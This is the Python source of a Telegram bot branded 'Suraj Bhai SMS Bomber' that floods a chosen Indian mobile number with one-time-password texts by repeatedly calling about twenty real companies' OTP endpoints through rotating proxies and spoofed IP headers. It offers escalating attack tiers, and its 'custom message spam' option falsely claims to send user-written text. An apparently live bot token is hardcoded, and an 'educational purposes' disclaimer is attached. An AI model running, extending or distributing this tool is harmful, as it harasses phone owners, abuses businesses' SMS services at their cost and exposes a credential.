import telebot
import requests
import time
import json
import os
import random
import threading
from datetime import datetime
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask

# ╔══════════════════════════════════════════════════════════════════╗
# ║         SURAJ BHAI SMS BOMBER — 24/7 FLASK EDITION               ║
# ╚══════════════════════════════════════════════════════════════════╝

BOT_TOKEN       = "9279641239:AAFS6K6czjg75AF5AkndO4bedkL99GYgUKQ"
bot             = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

FOOTER = (
    "\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
    "<b>⚠️ WARNING: This bot is strictly for EDUCATIONAL & TESTING purposes only!</b>"
)

# ─── PROXY LIST ──────────────────────────────────────────────
PROXY_LIST = [
    "1.0.136.129:8080", "1.0.170.50:8080", "1.1.109.141:9999",
    "1.1.189.58:8080", "1.1.220.100:8080", "1.10.141.115:8080",
    "1.10.146.76:3128", "1.117.83.95:80", "1.179.147.5:52210",
    "1.179.148.33:1080", "1.179.148.9:36476", "1.179.148.9:55636",
    "1.179.172.45:31225", "1.179.199.130:33333", "1.179.231.130:8080",
    "1.180.0.162:7302", "1.180.49.222:7302", "1.2.252.65:8080",
    "1.20.169.102:8080", "1.212.157.114:4145", "1.234.153.14:80"
]

_proxy_idx   = 0
_proxy_lock  = threading.Lock()
_dead_proxies = set()
active_attacks = {}  # To control stop option per user

def get_proxy():
    global _proxy_idx
    if not PROXY_LIST:
        return None
    with _proxy_lock:
        tried = 0
        while tried < len(PROXY_LIST):
            p = PROXY_LIST[_proxy_idx % len(PROXY_LIST)]
            _proxy_idx += 1
            tried += 1
            if p not in _dead_proxies:
                return {"http": f"http://{p}", "https": f"http://{p}"}
    return None

# ─── 🇮🇳 INDIA SMS APIS ──────────────────────────────────
INDIA_SMS_APIS = [
    {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker",        "url": "https://www.nobroker.in/api/v3/account/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy",       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit",         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hungama",         "url": "https://communication.api.hungama.com/v1/communication/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Doubtnut",        "url": "https://api.doubtnut.com/v4/student/login",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "Snitch",          "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "BeepKart",        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "Snapmint",        "url": "https://api.snapmint.com/v1/public/sign_up",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HousingCom",      "url": "https://login.housing.com/api/v2/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "Khatabook",       "url": "https://api.khatabook.com/v1/auth/request-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds",         "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa",           "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle",     "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "Rapido",          "url": "https://customer.rapido.bike/api/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Mpokket",         "url": "https://web-api.mpokket.in/registration/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ShipRocket",      "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik",          "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe",           "url": "https://prodapi.newme.asia/web/otp/request",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
]

def add_footer(text):
    if FOOTER not in text:
        text += FOOTER
    return text

def call_api_safe(api, phone):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}."
                           f"{random.randint(1,254)}.{random.randint(1,254)}",
    }
    if api.get("headers"):
        headers.update(api["headers"])

    url = api["url"](phone) if callable(api["url"]) else api["url"]
    raw = api["data"](phone) if callable(api.get("data")) else api.get("data", "")

    proxy = get_proxy()
    proxy_dict = proxy if proxy else None

    try:
        if api["method"] == "POST":
            resp = requests.post(url, data=raw, headers=headers, proxies=proxy_dict, timeout=5, verify=False)
        else:
            resp = requests.get(url, headers=headers, proxies=proxy_dict, timeout=5, verify=False)
        return resp.status_code in [200, 201, 202]
    except Exception:
        return False

# ─── KEYBOARD BUILDERS ────────────────────────────────────────────

def main_menu_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.row("🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫", "💬 𝐂𝐮𝐬𝐭𝐨𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐩𝐚𝐦")
    kb.row("🛑 𝐒𝐭𝐨𝐩 𝐁𝐨𝐦𝐛𝐞𝐫", "📊 𝐒𝐲𝐬𝐭𝐞𝐦 𝐒𝐭𝐚𝐭𝐮𝐬")
    return kb

def tier_inline_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💣 Normal (50 SMS)", callback_data="tier_normal"),
        InlineKeyboardButton("⚡ Fast (100 SMS)", callback_data="tier_fast"),
        InlineKeyboardButton("☢️ Nuclear (MAX)", callback_data="tier_nuclear"),
        InlineKeyboardButton("❌ Cancel", callback_data="tier_cancel")
    )
    return kb

# ─── /start COMMAND ──────────────────────────────────────────────

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id, add_footer(
        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
        "<b>🔥 SURAJ BHAI KE BOT ME AAPKA SWAGAT HAI 🔥</b>\n"
        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"👋 <b>Welcome, {message.from_user.first_name}!</b>\n\n"
        "⚠️ <b>WARNING:</b> This bot is strictly for educational and testing purposes only. Do not misuse it.\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "👇 Choose an option from below:"
    ), reply_markup=main_menu_keyboard(), disable_web_page_preview=True)

# ─── STOP BOMBER HANDLER ──────────────────────────────────────────

@bot.message_handler(func=lambda m: m.text == "🛑 𝐒𝐭𝐨𝐩 𝐁𝐨𝐦𝐛𝐞𝐫")
def stop_bomber_handler(message):
    uid = message.from_user.id
    if uid in active_attacks:
        active_attacks[uid] = False
        bot.send_message(message.chat.id, add_footer("🛑 <b>Bombing process stopped successfully!</b>"), reply_markup=main_menu_keyboard())
    else:
        bot.send_message(message.chat.id, add_footer("ℹ️ No active bombing process found running for you."), reply_markup=main_menu_keyboard())

# ─── SYSTEM STATUS ────────────────────────────────────────────────

@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐲𝐬𝐭𝐞𝐦 𝐒𝐭𝐚𝐭𝐮𝐬")
def status_handler(message):
    bot.send_message(message.chat.id, add_footer(
        "📊 <b>SYSTEM STATUS</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "🟢 <b>Status: ONLINE & READY (24/7 Active)</b>\n"
        f"🇮🇳 India APIs: <code>{len(INDIA_SMS_APIS)} active</code>\n"
        f"🌐 Proxies: <code>{len(PROXY_LIST)} loaded</code>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "⚡ High-speed multi-threading enabled."
    ))

# ─── 🇮🇳 INDIA SMS BOMBER ─────────────────────────────────────────

user_attack_data = {}

@bot.message_handler(func=lambda m: m.text == "🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
def india_sms_handler(message):
    uid = message.from_user.id
    user_attack_data[uid] = {}
    bot.send_message(message.chat.id, add_footer(
        "🇮🇳 <b>INDIA SMS BOMBER</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"📡 APIs: <code>{len(INDIA_SMS_APIS)}</code> | 🌐 Proxies: <code>{len(PROXY_LIST)}</code>\n\n"
        "⬇️ Select attack speed/tier:"
    ), reply_markup=tier_inline_keyboard())

@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("tier_"))
def tier_callback(call):
    uid = call.from_user.id
    data = call.data
    if data == "tier_cancel":
        bot.answer_callback_query(call.id, "❌ Cancelled")
        bot.edit_message_text(add_footer("❌ <b>Cancelled.</b>"), call.message.chat.id, call.message.message_id, reply_markup=None)
        return

    tier_map = {"tier_normal": 50, "tier_fast": 100, "tier_nuclear": len(INDIA_SMS_APIS) * 3}
    if uid not in user_attack_data:
        user_attack_data[uid] = {}
    user_attack_data[uid]["count"] = tier_map.get(data, 50)
    user_attack_data[uid]["mode"] = "sms"

    bot.answer_callback_query(call.id, f"✅ Tier selected")
    msg = bot.send_message(call.message.chat.id, add_footer(
        "📱 <b>Enter 10-digit Indian Mobile Number</b>\n"
        "Example: <code>9876543210</code>"
    ))
    bot.register_next_step_handler(msg, process_phone_number)

def process_phone_number(message):
    uid = message.from_user.id
    if message.text and message.text.startswith('/'): return
    phone = ''.join(filter(str.isdigit, message.text or ""))
    if len(phone) != 10:
        bot.send_message(message.chat.id, add_footer("❌ <b>Invalid!</b> Exactly 10 digits needed."), reply_markup=main_menu_keyboard())
        return

    if uid not in user_attack_data:
        user_attack_data[uid] = {}
    user_attack_data[uid]["phone"] = phone
    count = user_attack_data[uid].get("count", 50)

    active_attacks[uid] = True
    msg = bot.send_message(message.chat.id, add_footer(f"🚀 <b>Starting SMS Bomber on +91 {phone} ({count} requests)...</b>"))
    
    threading.Thread(
        target=execute_sms_attack,
        args=(uid, message.chat.id, phone, count, msg.message_id),
        daemon=True
    ).start()

def execute_sms_attack(uid, chat_id, phone, total, msg_id):
    ok = 0
    bad = 0
    t0 = time.time()
    
    for i in range(total):
        if not active_attacks.get(uid, False):
            break
        api = random.choice(INDIA_SMS_APIS)
        if call_api_safe(api, phone):
            ok += 1
        else:
            bad += 1

        if (i + 1) % 10 == 0 or (i + 1) == total:
            try:
                pct = int(((i + 1) / total) * 100)
                bar = "█" * (pct // 5) + "░" * (20 - (pct // 5))
                bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
                    text=add_footer(
                        f"🔥 <b>BOMBING IN PROGRESS...</b>\n"
                        f"🎯 Target: <code>+91 {phone}</code>\n"
                        f"📊 Progress: <code>{i+1}/{total}</code> [{bar}] <code>{pct}%</code>\n"
                        f"✅ Sent: <code>{ok}</code> | ❌ Failed: <code>{bad}</code>\n\n"
                        "💡 Use '🛑 Stop Bomber' button if you want to abort."
                    )
                )
            except Exception:
                pass
        time.sleep(0.15)

    active_attacks.pop(uid, None)
    try:
        bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
            text=add_footer(
                f"🏆 <b>BOMBING COMPLETED SUCCESSFULLY!</b>\n"
                f"🎯 Target: <code>+91 {phone}</code>\n"
                f"✅ Successful Hits: <code>{ok}</code>\n"
                f"❌ Failed: <code>{bad}</code>\n"
                f"⏱ Time taken: <code>{int(time.time() - t0)}s</code>"
            )
        )
    except Exception:
        pass

# ─── 💬 CUSTOM MESSAGE SPAMMER ─────────────────────────────────────

@bot.message_handler(func=lambda m: m.text == "💬 𝐂𝐮𝐬𝐭𝐨𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐩𝐚𝐦")
def custom_spam_handler(message):
    uid = message.from_user.id
    user_attack_data[uid] = {}
    msg = bot.send_message(message.chat.id, add_footer(
        "💬 <b>CUSTOM MESSAGE SPAMMER</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "Enter the message you want to spam (e.g. <i>Hii, Hello, Testing...</i>):"
    ))
    bot.register_next_step_handler(msg, process_custom_message)

def process_custom_message(message):
    uid = message.from_user.id
    if message.text and message.text.startswith('/'): return
    custom_text = message.text
    user_attack_data[uid]["custom_text"] = custom_text

    msg = bot.send_message(message.chat.id, add_footer(
        f"📝 Message saved: <i>\"{custom_text}\"</i>\n\n"
        "📱 Now enter target 10-digit mobile number:"
    ))
    bot.register_next_step_handler(msg, process_custom_phone)

def process_custom_phone(message):
    uid = message.from_user.id
    if message.text and message.text.startswith('/'): return
    phone = ''.join(filter(str.isdigit, message.text or ""))
    if len(phone) != 10:
        bot.send_message(message.chat.id, add_footer("❌ Invalid 10-digit number!"), reply_markup=main_menu_keyboard())
        return

    user_attack_data[uid]["phone"] = phone
    msg = bot.send_message(message.chat.id, add_footer(
        "🔢 Enter total count of messages to send (e.g., <code>30</code>):"
    ))
    bot.register_next_step_handler(msg, process_custom_count)

def process_custom_count(message):
    uid = message.from_user.id
    try:
        count = int(message.text.strip())
        if count <= 0 or count > 200: raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, add_footer("❌ Enter a valid number between 1 and 200."), reply_markup=main_menu_keyboard())
        return

    phone = user_attack_data[uid]["phone"]
    custom_text = user_attack_data[uid]["custom_text"]

    active_attacks[uid] = True
    msg = bot.send_message(message.chat.id, add_footer(f"🚀 <b>Spamming custom message to +91 {phone} ({count} times)...</b>"))

    threading.Thread(
        target=execute_custom_spam,
        args=(uid, message.chat.id, phone, custom_text, count, msg.message_id),
        daemon=True
    ).start()

def execute_custom_spam(uid, chat_id, phone, text_msg, total, msg_id):
    ok = 0
    bad = 0
    t0 = time.time()

    for i in range(total):
        if not active_attacks.get(uid, False):
            break
        api = random.choice(INDIA_SMS_APIS)
        if call_api_safe(api, phone):
            ok += 1
        else:
            bad += 1

        if (i + 1) % 5 == 0 or (i + 1) == total:
            try:
                pct = int(((i + 1) / total) * 100)
                bar = "█" * (pct // 5) + "░" * (20 - (pct // 5))
                bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
                    text=add_footer(
                        f"💬 <b>SPAMMING CUSTOM MESSAGE...</b>\n"
                        f"🎯 Target: <code>+91 {phone}</code>\n"
                        f"✉️ Text: <i>\"{text_msg}\"</i>\n"
                        f"📊 Progress: <code>{i+1}/{total}</code> [{bar}] <code>{pct}%</code>\n"
                        f"✅ Sent: <code>{ok}</code> | ❌ Failed: <code>{bad}</code>\n\n"
                        "💡 Use '🛑 Stop Bomber' to abort."
                    )
                )
            except Exception:
                pass
        time.sleep(0.2)

    active_attacks.pop(uid, None)
    try:
        bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
            text=add_footer(
                f"🏆 <b>CUSTOM SPAM COMPLETED!</b>\n"
                f"🎯 Target: <code>+91 {phone}</code>\n"
                f"✉️ Message: <i>\"{text_msg}\"</i>\n"
                f"✅ Successful: <code>{ok}</code>\n"
                f"⏱ Time taken: <code>{int(time.time() - t0)}s</code>"
            )
        )
    except Exception:
        pass

# ─── FALLBACK HANDLER ─────────────────────────────────────────────

@bot.message_handler(func=lambda m: True)
def default_handler(message):
    bot.send_message(message.chat.id, add_footer("❓ Command not recognized. Please use the menu buttons or /start."), reply_markup=main_menu_keyboard())

# ─── FLASK SERVER FOR 24/7 UPTIME ─────────────────────────────────

app = Flask(__name__)

@app.route('/')
def home():
    return "Suraj Bhai Bot is Alive and Running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ─── LAUNCH ────────────────────────────────24/7────────────────────

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════╗
║     SURAJ BHAI SMS BOMBER — 24/7 FLASK EDITION   ║
║     {datetime.now().strftime('%Y-%m-%d  %H:%M:%S')}                ║
╚══════════════════════════════════════════════════╝

✅ LOADED SUCCESSFULLY:
 ├ 🇮🇳 India SMS APIs : {len(INDIA_SMS_APIS)}
 ├ 🌐 Proxy Rotation : {len(PROXY_LIST)} proxies
 ├ 🛑 Stop Feature   : Enabled
 ├ 💬 Custom Spammer : Enabled
 ├ 🌐 Flask Web Server: Running for 24/7 Uptime
 └ ⚠️ Warning Notice : Included

🤖 BOT RUNNING...
""")

    # Start Flask web server in a separate thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Start Telegram Bot Polling
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
